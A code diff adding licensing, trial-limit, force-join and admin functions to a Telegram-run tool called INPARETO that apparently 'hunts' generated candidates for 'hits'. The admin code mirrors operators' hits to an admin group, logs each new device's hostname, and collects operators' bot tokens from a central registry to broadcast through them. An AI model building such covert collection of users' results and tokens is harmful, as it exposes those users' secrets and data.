+            reg.setdefault("free", {})[user_id] = dict(row)
+        cache.update(user_id=user_id, row=dict(row), reg=reg)
+        cache["cloud_pending"] = int(cache.get("cloud_pending") or 0) + 1
+
+
+def _plan_send_limit_telegram():
+    try:
+        body = format_operator_plan_gate("daily_limit", plan_build_snapshot(resolve_operator_telegram_id()))
+        bot_command_reply(body, force=True)
+    except Exception as exc:
+        log_event("PLAN", f"limit alert failed: {str(exc)[:60]}")
+
+
+def plan_handle_daily_limit_hit():
+    global _plan_limit_notify_signature
+    uid = resolve_operator_telegram_id()
+    sig = f"{uid}:{plan_utc_day()}"
+    if _plan_limit_notify_signature == sig:
+        apply_worker_pause_state()
+        return
+    _plan_limit_notify_signature = sig
+    log_event(
+        "PLAN",
+        f"Daily limit reached ({FREE_DAILY_GEN_LIMIT:,}/day) — switch to INPARETO Premium",
+    )
+    apply_worker_pause_state()
+    if TELEGRAM_ENABLED and TELEGRAM_CHAT_ID:
+        threading.Thread(target=_plan_send_limit_telegram, daemon=True).start()
+
+
+def plan_usage_bar(used, limit, width=10):
+    limit = max(1, int(limit or 1))
+    used = max(0, int(used or 0))
+    filled = min(width, int(width * used / limit))
+    bar = "▰" * filled + "▱" * (width - filled)
+    pct = min(100, int(100 * used / limit))
+    return bar, pct
+
+
+def format_operator_plan_gate(reason="no_license", info=None, expires_at=None):
+    info = info if isinstance(info, dict) else {}
+    uid = resolve_operator_telegram_id() or "—"
+    lines = [
+        format_panel_header(),
+        f"<b>{S['brand']} Plan Required</b>\n\n",
+    ]
+    if reason == "daily_limit":
+        used = int(info.get("day_count") or FREE_DAILY_GEN_LIMIT)
+        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+        bar, pct = plan_usage_bar(used, limit, 12)
+        lines.append(
+            "<b>Daily limit reached</b>\n"
+            f"You generated <code>{used:,}</code> / <code>{limit:,}</code> today "
+            f"({pct}%).\n"
+            f"<code>{bar}</code>\n\n"
+            "<b>Switch to INPARETO Premium</b> to continue hunting with "
+            "unlimited generation.\n\n"
+        )
+    elif reason == "trial_expired":
+        lines.append(
+            "<b>Free trial ended</b>\n"
+            f"Your {FREE_TRIAL_DAYS}-day INPARETO Free trial has expired.\n"
+            "<b>Redeem a license key</b> to unlock Premium and continue.\n\n"
+        )
+    elif reason == "expired":
+        lines.append(
+            f"<b>Premium license expired</b> "
+            f"({license_format_expiry(expires_at or info.get('expires_at'))}).\n"
+            "Renew with a new key or contact admin.\n\n"
+        )
+    elif reason == "cloud_offline":
+        lines.append(
+            "<b>Cannot verify plan</b> (cloud offline).\n"
+            "Check internet and try <code>/plan</code> or <code>/mylicense</code>.\n\n"
+        )
+    else:
+        lines.append(
+            "<b>No active plan</b> on this Telegram account.\n"
+            f"New users get <b>{FREE_TRIAL_DAYS} days free</b> "
+            f"({FREE_DAILY_GEN_LIMIT:,} generated/day).\n\n"
+        )
+    lines.append(
+        f"  {S['bullet']} <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>  {S['dash']} Premium\n"
+        f"  {S['bullet']} <code>/plan</code>  {S['dash']} Usage & trial status\n"
+        f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} License details\n"
+        f"  {S['bullet']} Your ID: <code>{html.escape(uid)}</code>\n\n"
+        f"<i>Support: {admin_channel_tag()}</i>"
+    )
+    return "".join(lines)
+
+
+def format_plan_message(user_id):
+    user_id = str(user_id or "").strip()
+    entitled, reason, info = operator_plan_entitled(user_id)
+    snap = info if isinstance(info, dict) else plan_build_snapshot(user_id)
+    if admin_is_admin(user_id):
+        return (
+            format_panel_header()
+            + "<b>INPARETO Plan</b>\n\n"
+            + tg_row("Tier", "Admin · unlimited")
+            + tg_row("Hunt", "Unrestricted")
+            + "\n<i>Full platform access — no quotas.</i>"
+        )
+    if snap.get("plan") == PLAN_PREMIUM:
+        exp = snap.get("expires_at")
+        days_left = snap.get("days_left", 0)
+        status = "Active" if snap.get("active") else "Expired"
+        return (
+            format_panel_header()
+            + "<b>INPARETO Premium</b>\n\n"
+            + tg_row("Status", status)
+            + tg_row("Telegram ID", str(user_id))
+            + tg_row("Expires", license_format_expiry(exp))
+            + tg_row("Remaining", f"~{days_left} day(s)")
+            + "\n<i>Unlimited generation · no daily cap · full hunt access.</i>"
+        )
+    used = int(snap.get("day_count") or 0)
+    limit = int(snap.get("limit") or FREE_DAILY_GEN_LIMIT)
+    remaining = int(snap.get("remaining_today") or max(0, limit - used))
+    bar, pct = plan_usage_bar(used, limit, 14)
+    trial_end = snap.get("trial_ends_at")
+    trial_days = snap.get("days_left", 0)
+    trial_lbl = license_format_expiry(trial_end) if trial_end else "—"
+    if snap.get("trial_expired"):
+        headline = "Trial expired"
+        foot = "Redeem Premium to continue hunting."
+    elif reason == "daily_limit" or used >= limit:
+        headline = "Daily limit reached"
+        foot = "Switch to INPARETO Premium to continue."
+    else:
+        headline = "INPARETO Free"
+        foot = f"{FREE_TRIAL_DAYS}-day trial · {FREE_DAILY_GEN_LIMIT:,} generated/day."
+    return (
+        format_panel_header()
+        + f"<b>{headline}</b>\n\n"
+        + tg_row("Telegram ID", str(user_id))
+        + tg_row("Trial ends", trial_lbl)
+        + tg_row("Trial left", f"~{trial_days} day(s)")
+        + tg_row("Today", f"{used:,} / {limit:,} ({pct}%)")
+        + tg_row("Remaining", f"{remaining:,} today")
+        + f"\n<code>{bar}</code>\n\n"
+        + f"<i>{foot}</i>\n"
+        + f"<i>Upgrade: <code>/redeem INPA-…</code></i>"
+    )
+
+
+def format_paid_license_gate(reason="no_license", expires_at=None):
+    if reason in ("daily_limit", "trial_expired"):
+        snap = plan_build_snapshot(resolve_operator_telegram_id() or "")
+        return format_operator_plan_gate(reason, snap, expires_at)
+    if reason == "no_license":
+        entitled, preason, info = operator_plan_entitled(resolve_operator_telegram_id() or "")
+        if entitled:
+            snap = info if isinstance(info, dict) else plan_build_snapshot(resolve_operator_telegram_id() or "")
+            if snap.get("plan") == PLAN_FREE:
+                return format_plan_message(resolve_operator_telegram_id())
+        if preason in ("trial_expired", "daily_limit"):
+            return format_operator_plan_gate(preason, info, expires_at)
+    lines = [
+        format_panel_header(),
+        f"<b>{S['brand']} Access</b>\n\n",
+        "<i>INPARETO Free trial or Premium license required.</i>\n\n",
+    ]
+    if reason == "expired":
+        lines.append(
+            f"<b>Premium license expired</b> "
+            f"({license_format_expiry(expires_at)}).\n"
+            "Renew with a new key or contact admin.\n\n"
+        )
+    elif reason == "cloud_offline":
+        lines.append(
+            "<b>Cannot verify plan</b> (cloud offline).\n"
+            "Check internet and try <code>/plan</code> again.\n\n"
+        )
+    else:
+        lines.append(
+            f"<b>Start with INPARETO Free</b> — {FREE_TRIAL_DAYS}-day trial, "
+            f"{FREE_DAILY_GEN_LIMIT:,} generated/day.\n"
+            "Redeem a key anytime for unlimited Premium.\n\n"
+        )
+    lines.append(
+        f"  {S['bullet']} <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>\n"
+        f"  {S['bullet']} <code>/plan</code>  {S['dash']} Trial & daily usage\n"
+        f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} License status\n"
+        f"  {S['bullet']} Your ID: <code>{html.escape(resolve_operator_telegram_id() or '—')}</code>\n\n"
+        f"<i>Support: {admin_channel_tag()}</i>"
+    )
+    return "".join(lines)
+
+
+def format_my_license_message(user_id):
+    user_id = str(user_id or "").strip()
+    if admin_is_admin(user_id):
+        return (
+            format_panel_header()
+            + "<b>License</b>\n\n"
+            + "<b>Admin</b> — unlimited Premium access.\n"
+        )
+    if plan_is_premium(user_id):
+        ok, reason, exp = paid_access_status(user_id)
+        if ok:
+            remaining = (exp - datetime.now(timezone.utc)).total_seconds() if exp else 0
+            days_left = max(0, int(remaining // 86400))
+            return (
+                format_panel_header()
+                + "<b>INPARETO Premium</b>\n\n"
+                + tg_row("Plan", "Premium · unlimited")
+                + tg_row("Telegram ID", str(user_id))
+                + tg_row("Expires", license_format_expiry(exp))
+                + tg_row("Remaining", f"~{days_left} day(s)")
+                + "\n<i>Hunt and remote control stay on until expiry.</i>"
+            )
+        return format_operator_plan_gate(reason or "expired", plan_build_snapshot(user_id), exp)
+    entitled, reason, info = operator_plan_entitled(user_id)
+    if entitled and info.get("plan") == PLAN_FREE:
+        return format_plan_message(user_id)
+    return format_operator_plan_gate(reason or "trial_expired", info)
+
+
+def admin_resolve_force_join_chat_ref(row):
+    """Turn DB row into a chat_id getChatMember accepts (@user, -100…, or invite)."""
+    raw_cid = (row.get("chat_id") or "").strip()
+    raw_inv = (row.get("invite_link") or "").strip()
+    combined = raw_inv or raw_cid
+    preview = (row.get("preview_name") or "").lower()
+
+    if "channel" in preview and _admin_settings.get("channel_username"):
+        return f"@{_admin_settings['channel_username'].lstrip('@')}"
+
+    if combined and "://" in combined and "t.me" not in combined.lower():
+        host = combined.split("://", 1)[-1].split("/")[0].strip()
+        if host and not re.fullmatch(r"-?\d+", host):
+            combined = f"https://t.me/{host.lstrip('@')}"
+
+    parsed_cid, parsed_inv = admin_parse_chat_target(combined)
+    ref = (parsed_cid or parsed_inv or combined or "").strip()
+    if not ref:
+        return ""
+
+    if ref.startswith("https://t.me/+") or "/joinchat/" in ref or "/+" in ref:
+        resolved = admin_resolve_chat_id_via_getchat(ref)
+        if resolved:
+            return resolved
+
+    if ref.startswith("@"):
+        return ref
+    if re.fullmatch(r"-?\d+", ref):
+        return ref
+    if "t.me/" in ref:
+        again_cid, _ = admin_parse_chat_target(ref)
+        return again_cid or ref
+    return f"@{ref.lstrip('@')}"
+
+
+def admin_resolve_chat_id_via_getchat(chat_ref):
+    """Resolve invite/@ link to numeric id when admin/operator bot is in the chat."""
+    chat_ref = (chat_ref or "").strip()
+    if not chat_ref:
+        return None
+    for api in _telegram_lookup_api_urls():
+        try:
+            response = requests.get(
+                f"{api}/getChat",
+                params={"chat_id": chat_ref},
+                timeout=ADMIN_MEMBER_TIMEOUT,
+            )
+            if response.ok:
+                chat_id = (response.json().get("result") or {}).get("id")
+                if chat_id is not None:
+                    return str(chat_id)
+        except Exception:
+            continue
+    return None
+
+
+def admin_get_chat_member_status(chat_ref, user_id):
+    """Check membership using admin bot, then operator bot (either may be in the chat)."""
+    user_id = str(user_id).strip()
+    chat_ref = (chat_ref or "").strip()
+    if not chat_ref or not user_id:
+        return None
+
+    refs = [chat_ref]
+    if chat_ref.startswith("@"):
+        resolved = admin_resolve_chat_id_via_getchat(chat_ref)
+        if resolved and resolved not in refs:
+            refs.append(resolved)
+
+    for api in _telegram_lookup_api_urls():
+        for ref in refs:
+            try:
+                response = requests.get(
+                    f"{api}/getChatMember",
+                    params={"chat_id": ref, "user_id": user_id},
+                    timeout=ADMIN_MEMBER_TIMEOUT,
+                )
+                if response.ok:
+                    status = (response.json().get("result") or {}).get("status")
+                    if status:
+                        return status
+            except Exception:
+                continue
+    return None
+
+
+def admin_check_force_join(user_id):
+    targets, err = admin_fetch_force_join_targets()
+    if err:
+        return False, [], f"Force-join check failed: {err}"
+    if not targets:
+        return True, [], None
+    if not _admin_settings.get("admin_bot_token") and not TELEGRAM_BOT_TOKEN:
+        return False, targets, "No bot token for join verification (set admin bot in /set adminbot)"
+    missing = []
+
+    def _check_row(row):
+        ref = admin_resolve_force_join_chat_ref(row)
+        status = admin_get_chat_member_status(ref, user_id)
+        if status in ADMIN_MEMBER_OK:
+            return None
+        bad = dict(row)
+        if status == "left":
+            bad["_verify_hint"] = "not joined yet"
+        elif status == "kicked":
+            bad["_verify_hint"] = "you were removed — re-join"
+        elif not status:
+            bad["_verify_hint"] = (
+                "cannot verify (add admin or operator bot to this chat, "
+                "or fix /force link to @username or t.me/…)"
+            )
+        else:
+            bad["_verify_hint"] = f"status: {status}"
+        return bad
+
+    workers = min(8, max(1, len(targets)))
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = [pool.submit(_check_row, row) for row in targets]
+        for fut in as_completed(futures):
+            try:
+                bad = fut.result()
+                if bad:
+                    missing.append(bad)
+            except Exception:
+                pass
+    return len(missing) == 0, missing, None
+
+
+def admin_invalidate_access(user_id=None):
+    _admin_access_cache["ok"] = False
+    _admin_access_cache["at"] = 0.0
+    invalidate_ban_cache(user_id)
+    license_invalidate_cache()
+    _invalidate_dashboard_plan_cache()
+    invalidate_operator_gate_cache()
+    if user_id is not None:
+        _admin_access_cache["user_id"] = str(user_id)
+
+
+def admin_user_access_granted(user_id):
+    user_id = str(user_id)
+    if admin_is_admin(user_id):
+        return True, None
+    now = time.time()
+    entitled, plan_reason, _ = operator_plan_entitled(user_id)
+    if not entitled:
+        if (
+            plan_reason == "cloud_offline"
+            and read_operator_session_verified(user_id)
+            and (_dashboard_local_premium_snap(user_id) or admin_is_admin(user_id))
+        ):
+            _admin_access_cache.update({"user_id": user_id, "ok": True, "at": now})
+            return True, None
+        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
+        return False, plan_reason
+    if operator_ban_active(user_id, force=False):
+        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
+        return False, "banned"
+    if (
+        _admin_access_cache["user_id"] == user_id
+        and _admin_access_cache["ok"]
+        and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL
+    ):
+        return True, None
+    ok, missing, ferr = admin_check_force_join(user_id)
+    if ferr:
+        if (
+            _admin_access_cache["user_id"] == user_id
+            and _admin_access_cache["ok"]
+            and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL * 6
+        ):
+            return True, None
+        return False, ferr
+    if not ok:
+        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
+        return False, missing
+    _admin_access_cache.update({"user_id": user_id, "ok": True, "at": now})
+    return True, None
+
+
+def telegram_validate_inline_url(url):
+    """Telegram url buttons require http(s) with a real host (t.me or domain with a dot)."""
+    url = (url or "").strip()
+    if not url:
+        return None
+    if url.startswith("@"):
+        url = f"https://t.me/{url.lstrip('@')}"
+    elif not url.startswith(("http://", "https://")):
+        if re.fullmatch(r"-?\d+", url):
+            return None
+        url = f"https://t.me/{url.lstrip('@/')}"
+    if url.startswith("http://"):
+        url = "https://" + url[7:]
+    try:
+        parsed = urlparse(url)
+        host = (parsed.netloc or "").lower().split(":")[0]
+        if not host:
+            return None
+        if host in ("t.me", "telegram.me") or host.endswith(".t.me"):
+            return url
+        if "." in host:
+            return url
+    except Exception:
+        pass
+    return None
+
+
+def force_join_row_button_url(row):
+    """Build a Telegram-safe join URL for inline keyboards (never use -100… chat ids as URLs)."""
+    raw_inv = (row.get("invite_link") or "").strip()
+    raw_cid = (row.get("chat_id") or "").strip()
+    combined = raw_inv or raw_cid
+    preview = (row.get("preview_name") or "").lower()
+
+    if "channel" in preview and _admin_settings.get("channel_username"):
+        uname = _admin_settings["channel_username"].lstrip("@")
+        return telegram_validate_inline_url(f"https://t.me/{uname}")
+
+    if combined and "://" in combined and "t.me" not in combined.lower():
+        host = combined.split("://", 1)[-1].split("/")[0].strip()
+        if host and not re.fullmatch(r"-?\d+", host):
+            combined = f"https://t.me/{host.lstrip('@')}"
+
+    _, parsed_inv = admin_parse_chat_target(combined)
+    for candidate in (parsed_inv, raw_inv, combined):
+        if not candidate or re.fullmatch(r"-?\d+", str(candidate).strip()):
+            continue
+        valid = telegram_validate_inline_url(candidate)
+        if valid:
+            return valid
+    if combined.startswith("@"):
+        return telegram_validate_inline_url(combined)
+    return None
+
+
+def sanitize_inline_keyboard_urls(keyboard):
+    """Drop invalid url buttons so sendMessage does not fail with HTTP 400."""
+    if not keyboard or "inline_keyboard" not in keyboard:
+        return keyboard
+    rows = []
+    for row in keyboard.get("inline_keyboard") or []:
+        clean = []
+        for btn in row:
+            url = btn.get("url")
+            if url:
+                valid = telegram_validate_inline_url(url)
+                if not valid:
+                    continue
+                btn = dict(btn)
+                btn["url"] = valid
+            clean.append(btn)
+        if clean:
+            rows.append(clean)
+    return {"inline_keyboard": rows} if rows else None
+
+
+def admin_join_gate_keyboard(missing):
+    rows = []
+    for row in missing[:6]:
+        link = force_join_row_button_url(row)
+        label = row.get("preview_name", "Join")[:30]
+        if link:
+            rows.append([{"text": f"Join · {label}", "url": link}])
+    rows.append([{"text": "✓ I joined — verify access", "callback_data": "VERIFY_JOIN"}])
+    return {"inline_keyboard": rows}
+
+
+def admin_format_gate_message(missing=None, reason=""):
+    lines = [
+        format_panel_header(),
+        f"<b>{S['brand']} Access Required</b>\n\n",
+        "<i>Complete Telegram steps before remote control or hunting starts.</i>\n\n",
+    ]
+    if reason == "banned":
+        lines.append("<b>You are suspended from INPARETO.</b>\nContact admin.\n")
+        return "".join(lines)
+    if reason and reason != "banned":
+        lines.append(f"<i>{html.escape(reason)}</i>\n\n")
+    targets, _ = admin_fetch_force_join_targets()
+    if not targets:
+        lines.append("<i>No force-join channels configured yet. Ask admin.</i>\n")
+        return "".join(lines)
+    lines.append("<b>Join all required channels/groups:</b>\n")
+    show = missing if missing else targets
+    for row in show:
+        name = html.escape(row.get("preview_name", "Channel"))
+        link = html.escape(row.get("invite_link") or row.get("chat_id", ""))
+        hint = row.get("_verify_hint", "")
+        lines.append(f"  {S['bullet']} <b>{name}</b>\n      <code>{link}</code>\n")
+        if hint and missing:
+            lines.append(f"      <i>{html.escape(hint)}</i>\n")
+    lines.append(
+        "\n<i>Join each link, then tap <b>Verify access</b> or send <code>/verify</code>.</i>\n"
+        "<i>Admin: add <b>admin bot</b> (or your operator bot) inside private groups "
+        "so membership can be checked.</i>\n"
+    )
+    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
+    return "".join(lines)
+
+
+_gate_terminal_notify_at = 0.0
+
+
+def build_terminal_access_notice_rows():
+    """Single source for terminal + dashboard access hints (paint_action_box rows)."""
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return [_terminal_verify_line("Telegram", "Link bot in joint.py setup", ANSI_YELLOW)]
+    entitled, plan_reason, info = operator_plan_entitled(user_id)
+    if not entitled:
+        if plan_reason == "trial_expired":
+            return [
+                _terminal_verify_line("Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED),
+                _terminal_verify_line("Fix", "/redeem INPA-… for Premium", ANSI_DIM),
+            ]
+        if plan_reason == "expired":
+            exp = info.get("expires_at") if isinstance(info, dict) else None
+            return [
+                _terminal_verify_line(
+                    "Premium", f"Expired · {license_format_expiry(exp)}", ANSI_RED,
+                ),
+                _terminal_verify_line("Fix", "/redeem NEW-KEY in bot", ANSI_DIM),
+            ]
+        if plan_reason == "cloud_offline":
+            return [
+                _terminal_verify_line("Plan", "Cloud offline — cannot verify", ANSI_RED),
+                _terminal_verify_line("Fix", "Check internet, retry /plan", ANSI_DIM),
+            ]
+        return [
+            _terminal_verify_line("Plan", "No active trial or license", ANSI_RED),
+            _terminal_verify_line("Fix", "/plan in bot · /redeem for Premium", ANSI_DIM),
+        ]
+    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
+        used = int(info.get("day_count") or 0)
+        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+        days_left = int(info.get("days_left") or 0)
+        if used >= limit:
+            return [
+                _terminal_verify_line(
+                    "Plan", f"Free daily limit {used:,}/{limit:,}", ANSI_RED,
+                ),
+                _terminal_verify_line("Fix", "Switch to INPARETO Premium — /redeem", ANSI_DIM),
+            ]
+        rows = [
+            _terminal_verify_line(
+                "Plan", f"Free · {days_left}d trial · {used:,}/{limit:,} today", ANSI_YELLOW,
+            ),
+        ]
+    else:
+        rows = []
+    granted, state = admin_user_access_granted(user_id)
+    if not granted:
+        if state == "banned":
+            return [_terminal_verify_line("Access", "Suspended — contact admin", ANSI_RED)]
+        if isinstance(state, list):
+            rows = [
+                _terminal_verify_line("Channels", "Join all required links in bot", ANSI_YELLOW),
+            ]
+            for row in state[:3]:
+                hint = row.get("_verify_hint", "pending")
+                name = row.get("preview_name", "Channel")
+                rows.append(_terminal_verify_line(name, hint, ANSI_DIM))
+            rows.append(_terminal_verify_line("Fix", "/verify in bot after joining", ANSI_DIM))
+            return rows
+        return [_terminal_verify_line("Access", str(state)[:50], ANSI_YELLOW)]
+    hg_ok, hg_reason = operator_hit_group_access_state(force=True)
+    gid = get_operator_hit_group_id()
+    if hg_ok:
+        return []
+    if hg_reason == "not_admin":
+        return [
+            _terminal_verify_line("Hit group", "Bot needs admin rights", ANSI_YELLOW),
+            _terminal_verify_line("Fix", "/verifyhitgroup in your hit group", ANSI_DIM),
+        ]
+    return [
+        _terminal_verify_line("Hit group", "Not linked yet", ANSI_YELLOW),
+        _terminal_verify_line("Fix", "Add bot to group → /verifyhitgroup", ANSI_DIM),
+    ]
+
+
+def _terminal_notice_title(rows):
+    text = " ".join(r[0] for r in rows).lower()
+    if "plan" in text or "license" in text:
+        if "expired" in text or "ended" in text or "limit" in text:
+            return "PLAN UPGRADE REQUIRED"
+        return "PLAN REQUIRED" if "premium" not in text else "PREMIUM REQUIRED"
+    if "channels" in text:
+        return "JOINS REQUIRED"
+    if "hit group" in text:
+        return "HIT GROUP REQUIRED"
+    if "banned" in text:
+        return "ACCESS SUSPENDED"
+    return "SETUP REQUIRED"
+
+
+def print_terminal_access_notice(*, force=False):
+    """Print one formatted box; skip duplicates and verification-wait spam."""
+    global _terminal_notice_signature, _terminal_notice_last_print_at
+    if _boot_configuring and not force:
+        return
+    if _session_awaiting_verification and not force:
+        return
+    if JACK_PANEL_LIVE and not force:
+        return
+    try:
+        rows = build_terminal_access_notice_rows()
+        if not rows:
+            _terminal_notice_signature = ""
+            return
+        sig = "|".join(f"{text}:{color}" for text, color in rows)
+        now = time.time()
+        if (
+            not force
+            and sig == _terminal_notice_signature
+            and (now - _terminal_notice_last_print_at) < TERMINAL_NOTICE_REPEAT_SEC
+        ):
+            return
+        _terminal_notice_signature = sig
+        _terminal_notice_last_print_at = now
+        print()
+        for line in paint_action_box(_terminal_notice_title(rows), rows, ANSI_YELLOW):
+            print(line)
+        print()
+    except Exception as exc:
+        log_event("TERM NOTICE", str(exc)[:100])
+
+
+def admin_apply_terminal_gate(*, notify_bot=False, source=""):
+    """Sync pause state; optional Telegram gate (terminal uses print_terminal_access_notice)."""
+    global _gate_terminal_notify_at
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return
+    reconcile_operator_hit_group()
+    sync_operator_access()
+    if operator_ban_active(user_id, force=False):
+        print_terminal_access_notice(force=True)
+        pause_event.clear()
+        return
+    if operator_access_ok(force=True) or _operator_hunt_trusted():
+        if not paused:
+            pause_event.set()
+        return
+    if _operator_hunt_trusted() or _access_trust_grace_active():
+        if not paused:
+            pause_event.set()
+        return
+    print_terminal_access_notice()
+    pause_event.clear()
+    now = time.time()
+    if notify_bot and TELEGRAM_ENABLED and not _session_awaiting_verification:
+        if now - _gate_terminal_notify_at >= HIT_GROUP_GATE_SEND_COOLDOWN:
+            _gate_terminal_notify_at = now
+            text, kb = admin_gate_reply_for_user(user_id)
+            if text:
+                if _is_hit_group_gate_text(text):
+                    send_hit_group_gate_reply(text, reply_markup=kb)
+                else:
+                    bot_command_reply(text, reply_markup=kb)
+
+
+def admin_sync_terminal_access():
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return False
+    if operator_ban_active(user_id, force=False):
+        return False
+    if read_operator_session_verified(user_id):
+        if admin_is_admin(user_id) or _dashboard_local_premium_snap(user_id):
+            if (
+                read_local_hit_group_id()
+                or get_operator_hit_group_id()
+                or hit_group_recently_delivered()
+            ):
+                return True
+    granted, state = admin_user_access_granted(user_id)
+    if not granted:
+        if state == "banned":
+            return False
+        if read_operator_session_verified(user_id) and _operator_hunt_trusted():
+            return True
+        return False
+    hg_ok, _hg = operator_hit_group_access_state(force=False)
+    if hg_ok:
+        return True
+    if read_local_hit_group_id() or hit_group_recently_delivered():
+        return True
+    return False
+
+
+def admin_notify_logs_new_device(device_hash, record, operator_id):
+    chat = _admin_settings.get("logs_group_id")
+    if not chat:
+        return
+    info = fetch_telegram_user(operator_id) if operator_id else None
+    name = (info or {}).get("display_name") or operator_id or "unknown"
+    op_link = telegram_profile_link_html(operator_id) if operator_id else html.escape(name)
+    lines = [
+        format_panel_header(),
+        "<b>◈ NEW USER · LOG</b>\n\n",
+        tg_row("Operator", op_link),
+        tg_row("Device", f"{device_hash[:16]}…"),
+        tg_row("Host", (record or {}).get("hostname") or platform.node()),
+        tg_row("API", (record or {}).get("api_host") or "pending"),
+        tg_row("Telegram ID", str(operator_id or "—")),
+        tg_row("Channel", admin_channel_tag()),
+    ]
+    if record:
+        lines.append(tg_row("First seen", str(record.get("first_seen", ""))[:19]))
+    admin_send_message(chat, "".join(lines))
+
+
+def admin_forward_hit_to_group(caption, photo_bytes=None, content_type="image/jpeg", operator_id=None):
+    chat = _admin_settings.get("hits_group_id")
+    if not chat:
+        log_event("ADMIN HIT", "mirror skipped — hits_group_id not set")
+        return False
+    op_id = operator_id or resolve_operator_id(TELEGRAM_CHAT_ID)
+    op_link = telegram_profile_link_html(op_id)
+    extra = f"\n\n<b>Operator</b> {op_link}\n<b>Channel</b> {admin_channel_tag()}"
+    full_caption = caption + extra
+    if photo_bytes:
+        resp = admin_send_photo(chat, full_caption, photo_bytes, content_type)
+    else:
+        resp = admin_send_message(chat, full_caption)
+    if resp is None:
+        log_event("ADMIN HIT", "mirror send failed")
+        return False
+    return True
+
+
+def admin_fetch_all_devices(limit=500):
+    reg, err = operator_links_fetch_registry(force=True)
+    if err:
+        return [], err
+    users = (reg or {}).get("users") or {}
+    rows = []
+    for uid, info in list(users.items())[: int(limit)]:
+        if not isinstance(info, dict):
+            continue
+        token = (info.get("bot_token") or "").strip()
+        if not token:
+            continue
+        rows.append(
+            {
+                "telegram_chat_id": str(uid),
+                "telegram_bot_token": token,
+                "display_name": (info.get("display_name") or "")[:64],
+                "last_seen": info.get("updated_at") or "",
+            }
+        )
+    return rows, None
+
+
+def admin_operator_bot_send(token, chat_id, text):
+    if not token or not chat_id:
+        return False, "missing token/chat"
+    try:
+        r = requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            json={
+                "chat_id": str(chat_id),
+                "text": text,
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True,
+            },
+            timeout=12,
+        )
+        if r.ok:
+            return True, None
+        return False, r.text[:80]
+    except Exception as exc:
+        return False, str(exc)
+
+
+def admin_broadcast_message(text):
+    devices, err = admin_fetch_all_devices()
+    if err:
+        return f"Device fetch failed: {err}"
+    sent = 0
+    failed = 0
+    for row in devices:
+        token = (row.get("telegram_bot_token") or "").strip()
+        chat = (row.get("telegram_chat_id") or "").strip()
+        if not token or not chat:
+            failed += 1
+            continue
+        ok, _ = admin_operator_bot_send(token, chat, text)
+        if ok:
+            sent += 1
+        else:
+            failed += 1
+    return f"Broadcast done · sent {sent} · failed {failed}"
+
+
+# Admin config keys: KEY → (settings_field, hint, max_len)
+ADMIN_SET_REGISTRY = {
+    "adminbot": ("admin_bot_token", "Force-join check bot token", 120),
+    "logs": ("logs_group_id", "New-user alerts group ID", 32),
+    "hits": ("hits_group_id", "Hits mirror group ID", 32),
+    "channel": ("channel_username", "Brand channel username", 32),
+    "botname": ("operator_bot_name", "Operator bot display name", 64),
+    "botdesc": ("operator_bot_description", "Operator bot about text", 512),
+    "botshort": ("operator_bot_short_description", "Operator bot short line", 120),
+    "botphoto": ("operator_bot_photo_url", "Operator bot PFP (Telegra.ph URL)", 500),
+    "opgrouptitle": ("operator_hit_group_title", "Operator hit group title", 128),
+    "opgroupdesc": ("operator_hit_group_description", "Operator hit group about", 255),
+    "opgroupphoto": ("operator_hit_group_photo_url", "Operator hit group PFP URL", 500),
+}
+
+ADMIN_SET_LEGACY = {
+    "/setadminbot": "adminbot",
+    "/setlogs": "logs",
+    "/sethits": "hits",
+    "/setchannel": "channel",
+    "/setbotname": "botname",
+    "/setbotdesc": "botdesc",
+    "/setbotshort": "botshort",
+    "/setbotphoto": "botphoto",
+}
+
+
+def _admin_mask_secret(value, show=8):
+    value = str(value or "")
+    if len(value) <= show + 2:
+        return value or "—"
+    return value[:show] + "…"
+
+
+def admin_format_set_guide():
+    lines = [
+        format_panel_header(),
+        "<b>◈ ADMIN · CONFIG HUB</b>\n\n",
+        "<i>Syntax: <code>/set KEY value</code> — spaces allowed in value.</i>\n",
+        "<code>/set list</code>  live values  ·  <code>/set admin ID</code>  add admin\n",
+        "<code>/set rebrand</code>  apply branding to all operator bots\n\n",
+    ]
+    sections = [
+        ("CORE", ("adminbot",)),
+        ("GROUPS", ("logs", "hits", "channel")),
+        ("OPERATOR BOT BRAND", ("botname", "botdesc", "botshort", "botphoto")),
+        ("OPERATOR HIT GROUP", ("opgrouptitle", "opgroupdesc", "opgroupphoto")),
+    ]
+    for title, keys in sections:
+        lines.append(f"<b>{title}</b>\n")
+        for key in keys:
+            field, hint, _max_len = ADMIN_SET_REGISTRY[key]
+            lines.append(f"  <code>/set {key}</code>  <i>{html.escape(hint)}</i>\n")
+        lines.append("\n")
+    lines.append("<b>SHORTCUTS</b> (still work)\n")
+    lines.append("  <code>/addadmin ID</code>  <code>/rebrand</code>  <code>/botdefaults</code>\n")
+    lines.append("  <code>/setlogs</code> <code>/sethits</code> … → same as <code>/set logs</code>\n\n")
+    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
+    return "".join(lines)
+
+
+def admin_format_set_list():
+    lines = [
+        format_panel_header(),
+        "<b>◈ LIVE CONFIG</b>\n\n",
+    ]
+    for key, (field, hint, _max_len) in ADMIN_SET_REGISTRY.items():
+        raw = _admin_settings.get(field, "")
+        if field == "admin_bot_token":
+            display = _admin_mask_secret(raw, 10)
+        elif field == "channel_username":
+            display = f"@{raw}" if raw else "—"
+        elif field in ("operator_bot_description",):
+            display = (str(raw)[:48] + "…") if raw and len(str(raw)) > 48 else (raw or "—")
